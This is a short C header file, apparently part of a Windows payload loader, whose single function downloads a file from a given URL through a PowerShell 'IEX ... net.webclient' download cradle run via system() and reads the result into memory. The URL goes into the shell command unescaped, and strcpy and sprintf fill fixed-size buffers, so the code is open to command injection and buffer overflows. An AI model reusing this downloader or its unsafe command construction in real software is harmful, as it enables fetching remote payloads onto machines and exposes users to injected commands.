#pragma once

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "../debug_print/debug_print.h"
#include "helper_functions/helper_functions.h"


// Downloads data from the URI specified in arg1 into a file.
// The data is then read from the file and returned.
//
// data_size receives the size of the data in bytes.
unsigned char* download_powershell(char *arg1, int *data_size) {
	DEBUG_PRINT("Downloading data to file via powershell...\n");
		
	char sh_filename[128];
	strcpy(sh_filename, get_filename_from_url(arg1));
	
	DEBUG_PRINT("sh_filename = %s\n", sh_filename);
		
	char download[500];  //how not to do it...
	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadfile('%s','%s'))\"", arg1, sh_filename);
	
	DEBUG_PRINT("command: %s\n", download);
	system(download);
	DEBUG_PRINT("Download done.\n");
		
	*data_size = get_filesize(sh_filename);	
	return load_textfile(sh_filename, *data_size);	
}
